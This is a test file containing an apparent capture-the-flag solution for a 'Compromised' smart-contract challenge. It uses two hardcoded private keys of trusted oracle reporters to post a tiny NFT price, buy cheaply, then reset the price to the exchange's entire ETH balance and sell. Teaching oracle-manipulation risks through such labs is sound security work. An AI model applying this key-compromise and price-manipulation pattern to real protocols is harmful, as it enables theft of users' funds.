...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    let trusted1 = new ethers.Wallet(
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
      ethers.provider
    );

    let trusted2 = new ethers.Wallet(
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
      ethers.provider
    );

    // set the nft buy price to 0.0000001 ether
    await this.oracle
      .connect(trusted1)
    ...
    await this.oracle
      .connect(trusted2)
      .postPrice("DVNFT", ethers.utils.parseEther("0.0000001"));
    ...
    // set the nft sell price to total eth

    let exchangeBal = await ethers.provider.getBalance(this.exchange.address);

    await this.oracle.connect(trusted1).postPrice("DVNFT", exchangeBal);

    await this.oracle.connect(trusted2).postPrice("DVNFT", exchangeBal);

    // sell the nft
    const tx = await this.exchange.queryFilter("TokenBought");
    const tokenId = tx[0].args.tokenId;
    await this.nftToken
      .connect(attacker)
      .approve(this.exchange.address, tokenId);
    await await this.exchange.connect(attacker).sellOne(tokenId);
